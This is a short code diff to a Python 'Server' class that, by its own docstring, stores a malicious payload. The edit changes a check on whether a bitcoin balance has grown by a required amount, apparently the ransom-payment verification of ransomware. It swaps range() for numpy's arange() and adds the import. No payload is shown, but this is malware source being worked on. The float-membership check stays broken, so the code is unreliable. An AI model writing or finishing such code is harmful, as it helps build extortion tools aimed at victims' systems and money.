@@ -16,6 +16,7 @@ import rsa
 import shutil
 import requests
 import re
+import numpy as np
 
 class Server:
     """ This class represents a server that stores some malicious payload and sends
@@ -143,9 +144,9 @@ class Server:
         
         print("balance changed by: " + str(change))
         print("Required change: " + str(bitcoin_needed))
-        print(change in range(float(bitcoin_needed) - 0.0001, float(bitcoin_needed) + 0.0001))
+        print(change in np.arange(float(bitcoin_needed) - 0.0001, float(bitcoin_needed) + 0.0001))
 
-        if (change in range(float(bitcoin_needed) - 0.0001, float(bitcoin_needed) + 0.0001)):
+        if (change in np.arange(float(bitcoin_needed) - 0.0001, float(bitcoin_needed) + 0.0001)):
             return True
         else:
             global initial_balance
